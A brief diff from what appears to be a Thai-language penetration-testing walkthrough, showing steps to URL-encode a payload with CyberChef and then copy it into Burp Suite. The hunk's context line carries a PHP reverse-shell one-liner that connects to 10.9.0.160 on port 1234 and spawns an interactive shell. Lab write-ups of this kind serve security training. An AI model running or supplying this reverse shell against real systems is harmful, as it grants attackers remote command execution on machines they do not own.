@@ -281,3 +281,5 @@ php -r '$sock=fsockopen("10.9.0.160",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 4. CyberChef จะแปลง payload ให้กลายเป็นรูปแบบ URL-safe
 
 ![chef](images/17.png)
+
+5. คัดลอกผลลัพธ์ไปใช้ต่อในการยิงผ่าน Burp Suite
